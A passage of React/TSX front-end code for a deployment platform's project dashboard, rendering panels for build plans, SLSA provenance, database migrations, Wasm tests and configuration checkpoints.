            <Layers className="w-3.5 h-3.5" />
            <span>{t('pd.smartpackBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('slsa')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'slsa'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <ShieldCheck className="w-3.5 h-3.5" />
            <span>{t('pd.slsaBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('migration')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'migration'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <Database className="w-3.5 h-3.5" />
            <span>{t('pd.migBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('wasm')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'wasm'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <CpuIcon className="w-3.5 h-3.5" />
            <span>{t('pd.wasmBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('timemachine')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'timemachine'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <History className="w-3.5 h-3.5" />
            <span>{t('pd.tmBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('shadow')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'shadow'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <GitCompare className="w-3.5 h-3.5" />
            <span>{t('pd.srBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('terminal')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'terminal'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <Terminal className="w-3.5 h-3.5" />
            <span>{t('pd.termBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('healer')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'healer'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <Wrench className="w-3.5 h-3.5" />
            <span>{t('pd.healBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('drift')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'drift'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <Activity className="w-3.5 h-3.5" />
            <span>{t('pd.driftBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('canary')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'canary'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <Gauge className="w-3.5 h-3.5" />
            <span>{t('pd.canaryBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('autoscaler')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'autoscaler'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <Cpu className="w-3.5 h-3.5" />
            <span>{t('pd.autoBtn')}</span>
          </button>

          <button
            type="button"
            onClick={() => toggleCockpit('forensics')}
            className={`culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${
              activeCockpit === 'forensics'
                ? 'bg-slate-900 text-white border-slate-900'
                : 'bg-white hover:bg-slate-50 text-slate-700 border-slate-200'
            }`}
          >
            <Search className="w-3.5 h-3.5" />
            <span>{t('pd.forensicsBtn')}</span>
          </button>
        </div>
      </div>

      {/* Pestañas agrupadas en 3 bloques con separador sutil */}
      <div
        role="tablist"
        aria-label="Secciones del proyecto"
        className="flex items-center border-b border-slate-200 gap-1 px-1 overflow-x-auto no-scrollbar"
      >
        {tabGroups.map((group, gIdx) => (
          <React.Fragment key={group.group}>
            {gIdx > 0 && <span aria-hidden="true" className="h-4 w-px bg-slate-200 mx-2 mb-2.5 shrink-0" />}
            <div className="flex items-center gap-3.5 shrink-0">
              {group.items.map((t) => {
                const selected = activeTab === t.id;
                return (
                  <button
                    key={t.id}
                    type="button"
                    role="tab"
                    aria-selected={selected}
                    onClick={() => setActiveTab(t.id)}
                    className={`flex items-center gap-1.5 pb-3 text-xs font-medium border-b-2 transition-colors whitespace-nowrap cursor-pointer shrink-0 ${
                      selected
                        ? 'border-slate-900 text-slate-900'
                        : 'border-transparent text-slate-500 hover:text-slate-800'
                    }`}
                  >
                    <t.icon className={`w-3.5 h-3.5 ${selected ? 'text-slate-900' : 'text-slate-400'}`} />
                    <span>{t.label}</span>
                    {typeof t.count === 'number' && t.count > 0 && (
                      <span className="px-1.5 py-0.2 rounded-full bg-slate-100 text-slate-600 text-[10px] font-mono tabular-nums">
                        {t.count}
                      </span>
                    )}
                  </button>
                );
              })}
            </div>
          </React.Fragment>
        ))}
      </div>

      {/* Collapsible SmartPack Build-Plan Inspector */}
      {smartPackOpen && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-4 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <Layers className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.smartpackTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.smartpackDesc')}</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 shrink-0">
              <button
                type="button"
                disabled={smartPackLoading}
                onClick={() => void handleLoadSmartPack()}
                className="inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-white hover:bg-slate-50 border border-slate-200 text-slate-700 font-medium cursor-pointer disabled:opacity-50"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${smartPackLoading ? 'animate-spin' : ''}`} />
                <span>{smartPackLoading ? t('pd.smartpackInspecting') : t('pd.smartpackRefresh')}</span>
              </button>
              <button
                type="button"
                onClick={() => setSmartPackOpen(false)}
                aria-label="Close SmartPack Plan"
                className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {smartPackLoading && !smartPackPlan && (
            <div className="flex items-center gap-2 py-4 text-slate-500">
              <Loader2 className="w-4 h-4 animate-spin" />
              <span>{t('pd.smartpackInspecting')}</span>
            </div>
          )}

          {smartPackError && (
            <div className="p-3 rounded-xl bg-amber-50 border border-amber-200 text-amber-900">
              {smartPackError}
            </div>
          )}

          {smartPackPlan && (() => {
            const zstdEnabled = smartPackPlan.ociExport?.zstdChunked ?? smartPackPlan.zstdChunked ?? true;
            const memCap = smartPackPlan.resourceLimits?.memory ?? (smartPackPlan.resourceLimits?.buildMemoryMb ? `${smartPackPlan.resourceLimits.buildMemoryMb}m` : (smartPackPlan.limits?.memoryMb ? `${smartPackPlan.limits.memoryMb}m` : 'auto'));
            const cpuCap = smartPackPlan.resourceLimits?.buildCpus ?? smartPackPlan.resourceLimits?.cpus ?? smartPackPlan.limits?.cpus ?? 'auto';
            const ignoreObj = smartPackPlan.dockerignore && !Array.isArray(smartPackPlan.dockerignore)
              ? smartPackPlan.dockerignore
              : null;
            const ignoreContent = ignoreObj
              ? ignoreObj.content
              : (Array.isArray(smartPackPlan.dockerignore) ? smartPackPlan.dockerignore.join('\n') : '');
            const ignoreCount = ignoreObj
              ? ignoreObj.excludedCount
              : (Array.isArray(smartPackPlan.dockerignore) ? smartPackPlan.dockerignore.length : 0);
            const startCmdStr = Array.isArray(smartPackPlan.startCommand)
              ? smartPackPlan.startCommand.join(' ')
              : (smartPackPlan.startCommand || '—');

            return (
              <div className="space-y-3.5">
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5 tabular-nums">
                  <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                    <span className="text-[10px] uppercase tracking-wider text-slate-400 font-semibold block">Stack (18)</span>
                    <div className="font-semibold text-slate-900 mt-0.5 truncate">{smartPackPlan.label || smartPackPlan.stack}</div>
                    <div className="font-mono text-[11px] text-slate-500 mt-0.5">
                      {smartPackPlan.packageManager || smartPackPlan.runtime || 'native'} · :{smartPackPlan.containerPort ?? smartPackPlan.port ?? 3000}
                    </div>
                  </div>
                  <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                    <span className="text-[10px] uppercase tracking-wider text-slate-400 font-semibold block">{t('pd.smartpackHash')}</span>
                    <div className="font-mono font-semibold text-slate-900 mt-0.5 truncate" title={smartPackPlan.deterministicHash || ''}>
                      {smartPackPlan.deterministicHash ? `${smartPackPlan.deterministicHash.slice(0, 16)}…` : '—'}
                    </div>
                    <div className="text-[11px] text-slate-500 mt-0.5">
                      {smartPackPlan.layers?.length ?? 1} stage{(smartPackPlan.layers?.length ?? 1) === 1 ? '' : 's'}
                    </div>
                  </div>
                  <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                    <span className="text-[10px] uppercase tracking-wider text-slate-400 font-semibold block">{t('pd.smartpackCaps')}</span>
                    <div className="font-mono font-semibold text-slate-900 mt-0.5">
                      --memory {memCap} · --cpus {cpuCap}
                    </div>
                    <div className="text-[11px] text-slate-500 mt-0.5">
                      {smartPackPlan.resourceLimits?.reservedHeadroomMb != null
                        ? `${smartPackPlan.resourceLimits.reservedHeadroomMb} MB headroom`
                        : 'VPS OOM guard'}
                    </div>
                  </div>
                  <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                    <span className="text-[10px] uppercase tracking-wider text-slate-400 font-semibold block">{t('pd.smartpackOci')}</span>
                    <div className="mt-1 flex items-center gap-1.5 flex-wrap">
                      <span className={`px-2 py-0.5 rounded-md font-mono text-[10px] font-semibold border ${
                        zstdEnabled
                          ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                          : 'bg-slate-100 text-slate-600 border-slate-200'
                      }`}>
                        {zstdEnabled ? 'zstd:chunked' : 'gzip'}
                      </span>
                      <span className="px-2 py-0.5 rounded-md bg-white border border-slate-200 font-mono text-[10px] text-slate-600">
                        {ignoreCount} ignored
                      </span>
                    </div>
                  </div>
                </div>

                <div className="flex flex-wrap items-center gap-2 text-[11px] font-mono text-slate-600">
                  {smartPackPlan.buildCommand && (
                    <span className="px-2 py-1 rounded-lg bg-slate-50 border border-slate-200 truncate max-w-full">
                      build: {smartPackPlan.buildCommand}
                    </span>
                  )}
                  <span className="px-2 py-1 rounded-lg bg-slate-50 border border-slate-200 truncate max-w-full">
                    start: {startCmdStr}
                  </span>
                </div>

                <div className="flex flex-wrap items-center gap-2">
                  {ignoreContent && (
                    <button
                      type="button"
                      onClick={() => setSmartPackShowIgnore((v) => !v)}
                      className="inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 font-medium cursor-pointer"
                    >
                      {smartPackShowIgnore ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
                      <span>{t('pd.smartpackShowIgnore')} ({ignoreCount})</span>
                    </button>
                  )}
                  {smartPackPlan.dockerfile && (
                    <button
                      type="button"
                      onClick={() => setSmartPackShowDockerfile((v) => !v)}
                      className="inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 font-medium cursor-pointer"
                    >
                      <FileCode2 className="w-3.5 h-3.5" />
                      <span>{t('pd.smartpackShowDockerfile')}</span>
                      {smartPackShowDockerfile ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
                    </button>
                  )}
                  {ignoreContent && (
                    <button
                      type="button"
                      onClick={async () => {
                        const ok = await copyToClipboard(ignoreContent);
                        if (!ok) return;
                        setSmartPackCopied('ignore');
                        window.setTimeout(() => setSmartPackCopied(null), 1600);
                      }}
                      className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 font-medium cursor-pointer"
                    >
                      {smartPackCopied === 'ignore' ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{smartPackCopied === 'ignore' ? t('pd.smartpackCopied') : t('pd.smartpackCopyIgnore')}</span>
                    </button>
                  )}
                  {smartPackPlan.dockerfile && (
                    <button
                      type="button"
                      onClick={async () => {
                        const ok = await copyToClipboard(smartPackPlan.dockerfile || '');
                        if (!ok) return;
                        setSmartPackCopied('dockerfile');
                        window.setTimeout(() => setSmartPackCopied(null), 1600);
                      }}
                      className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 font-medium cursor-pointer"
                    >
                      {smartPackCopied === 'dockerfile' ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{smartPackCopied === 'dockerfile' ? t('pd.smartpackCopied') : t('pd.smartpackCopyDockerfile')}</span>
                    </button>
                  )}
                </div>

                {smartPackShowIgnore && ignoreContent && (
                  <pre className="p-3.5 rounded-xl bg-slate-950 text-slate-100 font-mono text-[11px] leading-relaxed max-h-48 overflow-auto border border-slate-800">
                    {ignoreContent}
                  </pre>
                )}

                {smartPackShowDockerfile && smartPackPlan.dockerfile && (
                  <pre className="p-3.5 rounded-xl bg-slate-950 text-emerald-200 font-mono text-[11px] leading-relaxed max-h-64 overflow-auto border border-slate-800">
                    {smartPackPlan.dockerfile}
                  </pre>
                )}
              </div>
            );
          })()}
        </section>
      )}

      {/* Cycle-5 Cockpit Drawer: SLSA v1.1 Provenance / Atomic DB Migration / Micro-Wasm */}
      {activeCockpit === 'slsa' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-3.5 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <ShieldCheck className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.slsaTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.slsaDesc')}</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 shrink-0">
              <button
                type="button"
                disabled={slsaLoading}
                onClick={() => void handleSignAndVerifySlsa()}
                className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
              >
                {slsaLoading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-3.5 h-3.5" />}
                <span>{slsaLoading ? t('pd.slsaRunning') : t('pd.slsaRun')}</span>
              </button>
              <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close SLSA panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer">
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {slsaError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{slsaError}</div>}

          {slsaAttest && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center gap-2">
                <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full font-semibold border ${
                  slsaVerify?.valid
                    ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                    : 'bg-red-50 text-red-700 border-red-200'
                }`}>
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>{slsaVerify?.valid ? t('pd.slsaValid') : t('pd.slsaInvalid')}</span>
                </span>
                <span className="px-2 py-0.5 rounded-md bg-slate-100 border border-slate-200 font-mono text-[10px] text-slate-700">
                  {slsaVerify?.predicateType || slsaAttest.predicateType || 'https://slsa.dev/provenance/v1'}
                </span>
                {(slsaVerify?.subjectDigest || slsaAttest.subjectDigest || slsaAttest.statement?.subject?.[0]?.digest?.sha256) && (
                  <span className="px-2 py-0.5 rounded-md bg-slate-100 border border-slate-200 font-mono text-[10px] text-slate-600 tabular-nums">
                    sha256:{String(slsaVerify?.subjectDigest || slsaAttest.subjectDigest || slsaAttest.statement?.subject?.[0]?.digest?.sha256).slice(0, 16)}…
                  </span>
                )}
              </div>

              <div className="p-3 rounded-xl bg-slate-950 text-slate-100 border border-slate-800 flex items-center justify-between gap-2 flex-wrap">
                <code className="font-mono text-[11px] text-emerald-300 inline-flex items-center gap-1.5 break-all">
                  <Terminal className="w-3.5 h-3.5 shrink-0 text-slate-400" />
                  culkibo verify --json
                </code>
                <button
                  type="button"
                  onClick={async () => {
                    const ok = await copyToClipboard('culkibo verify --json');
                    if (!ok) return;
                    setSlsaCopied(true);
                    window.setTimeout(() => setSlsaCopied(false), 1600);
                  }}
                  className="inline-flex items-center gap-1 px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-100 text-[11px] font-medium cursor-pointer"
                >
                  {slsaCopied ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>{t('pd.slsaCopyCli')}</span>
                </button>
              </div>
            </div>
          )}
        </section>
      )}

      {activeCockpit === 'migration' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-3.5 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <Database className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.migTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.migDesc')}</p>
              </div>
            </div>
            <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close Migration panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer self-start">
              <X className="w-4 h-4" />
            </button>
          </div>

          <form onSubmit={(e) => void handlePlanMigration(e)} className="flex flex-col sm:flex-row gap-2 items-stretch sm:items-end">
            <label className="flex-1 block">
              <span className="font-medium text-slate-700 block mb-1">{t('pd.migCmdLabel')}</span>
              <input
                type="text"
                value={migCommand}
                onChange={(e) => setMigCommand(e.target.value)}
                placeholder="npx prisma migrate deploy"
                className="w-full px-3 py-1.5 rounded-lg border border-slate-200 bg-white font-mono text-slate-900"
              />
            </label>
            <button
              type="submit"
              disabled={migLoading || !migCommand.trim()}
              className="culkibo-press inline-flex items-center justify-center gap-1.5 px-3.5 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50 shrink-0"
            >
              {migLoading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Database className="w-3.5 h-3.5" />}
              <span>{migLoading ? t('pd.migRunning') : t('pd.migRun')}</span>
            </button>
          </form>

          {migError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{migError}</div>}

          {migPlan && (
            <div className="space-y-2.5">
              <div className="grid grid-cols-1 sm:grid-cols-4 gap-2 tabular-nums">
                <div className="p-2.5 rounded-xl bg-slate-50 border border-slate-200">
                  <span className="text-[10px] uppercase text-slate-400 font-semibold block">Lease Lock</span>
                  <span className="font-mono font-semibold text-slate-900 truncate block mt-0.5">{migPlan.lockKey}</span>
                </div>
                <div className="p-2.5 rounded-xl bg-slate-50 border border-slate-200">
                  <span className="text-[10px] uppercase text-slate-400 font-semibold block">Pre-Snapshot</span>
                  <span className="font-mono font-semibold text-emerald-700 block mt-0.5">{migPlan.snapshotRequired ? 'required (safe)' : 'optional'}</span>
                </div>
                <div className="p-2.5 rounded-xl bg-slate-50 border border-slate-200">
                  <span className="text-[10px] uppercase text-slate-400 font-semibold block">Cutover Guard</span>
                  <span className="font-mono font-semibold text-slate-900 block mt-0.5">abortOnFail: {String(migPlan.abortCutoverOnFailure)}</span>
                </div>
                <div className="p-2.5 rounded-xl bg-slate-50 border border-slate-200">
                  <span className="text-[10px] uppercase text-slate-400 font-semibold block">Timeout</span>
                  <span className="font-mono font-semibold text-slate-900 block mt-0.5">{Math.round((migPlan.timeoutMs || 120000) / 1000)}s · shell:false</span>
                </div>
              </div>
              <div className="p-2.5 rounded-xl bg-slate-950 text-emerald-300 font-mono text-[11px] border border-slate-800 break-all">
                argv: {JSON.stringify(migPlan.argv)}
              </div>
            </div>
          )}
        </section>
      )}

      {activeCockpit === 'wasm' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-3.5 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <CpuIcon className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.wasmTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.wasmDesc')}</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 shrink-0">
              <button
                type="button"
                disabled={wasmLoading}
                onClick={() => void handleTestWasm()}
                className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
              >
                {wasmLoading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Zap className="w-3.5 h-3.5" />}
                <span>{wasmLoading ? t('pd.wasmRunning') : t('pd.wasmRun')}</span>
              </button>
              <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close Micro-Wasm panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer">
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {wasmError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{wasmError}</div>}

          {wasmResult && (
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 tabular-nums">
              <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                <span className="text-[10px] uppercase text-slate-400 font-semibold block">Execution Time</span>
                <span className="font-mono text-base font-semibold text-emerald-700 block mt-0.5">
                  {typeof wasmResult.execMs === 'number' ? `${wasmResult.execMs.toFixed(2)} ms` : '—'}
                </span>
              </div>
              <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                <span className="text-[10px] uppercase text-slate-400 font-semibold block">Linear Memory</span>
                <span className="font-mono text-base font-semibold text-slate-900 block mt-0.5">
                  {wasmResult.memoryBytes != null ? `${Math.round(wasmResult.memoryBytes / 1024)} KiB` : '64 KiB'}
                </span>
              </div>
              <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                <span className="text-[10px] uppercase text-slate-400 font-semibold block">Compute Output</span>
                <span className="font-mono text-sm font-semibold text-slate-900 block mt-0.5 truncate" title={String(wasmResult.result ?? wasmResult.body ?? '')}>
                  HTTP {wasmResult.status} · {wasmResult.result !== undefined ? `result=${wasmResult.result}` : (wasmResult.body || 'OK')}
                </span>
              </div>
            </div>
          )}
        </section>
      )}

      {activeCockpit === 'timemachine' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-3.5 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <History className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.tmTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.tmDesc')}</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 shrink-0">
              <button
                type="button"
                disabled={tmCreating}
                onClick={() => void handleCreateCheckpoint()}
                className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
              >
                {tmCreating ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Plus className="w-3.5 h-3.5" />}
                <span>{tmCreating ? t('pd.tmCreating') : t('pd.tmCreate')}</span>
              </button>
              <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close Time-Machine panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer">
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {tmError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{tmError}</div>}

          {tmCheckpoints.length === 0 ? (
            <div className="text-slate-500 py-3">{tmLoading ? '…' : t('pd.tmEmpty')}</div>
          ) : (
            <div className="divide-y divide-slate-100 border border-slate-200 rounded-xl overflow-hidden">
              {tmCheckpoints.slice(0, 6).map((cp) => {
                const envN = cp.counts?.envVars ?? cp.envCount ?? cp.counts?.envKeys ?? cp.state?.envCount ?? cp.snapshot?.envKeys?.length ?? 0;
                const domN = cp.counts?.domains ?? cp.domainsCount ?? cp.state?.domains?.length ?? cp.snapshot?.domains?.length ?? 0;
                const cronN = cp.counts?.crons ?? cp.cronsCount ?? cp.state?.crons?.length ?? cp.snapshot?.crons?.length ?? 0;
                const imgLabel = cp.imageTag || cp.state?.imageTag || 'config';
                return (
                  <div key={cp.id} className="px-3.5 py-2.5 bg-white flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                    <div className="min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="font-semibold text-slate-900">{cp.label || cp.id}</span>
                        <span className="px-1.5 py-0.5 rounded bg-slate-100 border border-slate-200 font-mono text-[10px] text-slate-600 tabular-nums">
                          sha256:{String(cp.sha256 || '').slice(0, 12)}
                        </span>
                      </div>
                      <div className="text-[11px] font-mono text-slate-500 mt-0.5 tabular-nums">
                        {envN} env · {domN} domains · {cronN} crons · {imgLabel}
                      </div>
                    </div>
                    <button
                      type="button"
                      disabled={tmLoading}
                      onClick={() => void handleDryRunRestore(cp.id)}
                      className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 font-medium cursor-pointer shrink-0 disabled:opacity-50"
                    >
                      <History className="w-3 h-3" />
                      <span>{t('pd.tmDryRun')}</span>
                    </button>
                  </div>
                );
              })}
            </div>
          )}

          {tmRestorePreview && (() => {
            const mut = tmRestorePreview.mutations;
            const mutationLines: string[] = Array.isArray(mut)
              ? mut
              : mut && typeof mut === 'object'
                ? [
                    mut.imageTagChanged ? 'Image revision tag will be reverted to checkpoint state' : null,
                    mut.projectFields && mut.projectFields.length > 0 ? `Config fields: ${mut.projectFields.join(', ')}` : null,
                    (mut.envKeysAdded?.length || mut.envKeysRemoved?.length || mut.envKeysChanged?.length)
                      ? `Env HMAC reconciliation: +${mut.envKeysAdded?.length ?? 0} / -${mut.envKeysRemoved?.length ?? 0} / ~${mut.envKeysChanged?.length ?? 0}`
                      : null,
                    (mut.domainsToAdd?.length || mut.domainsToRemove?.length || mut.domainsToUpdate?.length)
                      ? `Domains & Caddy edge: +${mut.domainsToAdd?.length ?? 0} / -${mut.domainsToRemove?.length ?? 0} / ~${mut.domainsToUpdate?.length ?? 0}`
                      : null,
                    (mut.cronsToAdd?.length || mut.cronsToRemove?.length || mut.cronsToUpdate?.length)
                      ? `Crons: +${mut.cronsToAdd?.length ?? 0} / -${mut.cronsToRemove?.length ?? 0} / ~${mut.cronsToUpdate?.length ?? 0}`
                      : null,
                  ].filter((x): x is string => Boolean(x))
                : [];
            return (
              <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 space-y-1.5">
                <div className="font-semibold text-slate-900 flex items-center justify-between gap-2">
                  <span>{t('pd.tmDryRunTitle')} · {tmRestorePreview.checkpointId}</span>
                  <button type="button" onClick={() => setTmRestorePreview(null)} className="text-slate-400 hover:text-slate-700 cursor-pointer"><X className="w-3.5 h-3.5" /></button>
                </div>
                {mutationLines.length > 0 ? (
                  <ul className="list-disc list-inside text-[11px] text-slate-600 space-y-0.5">
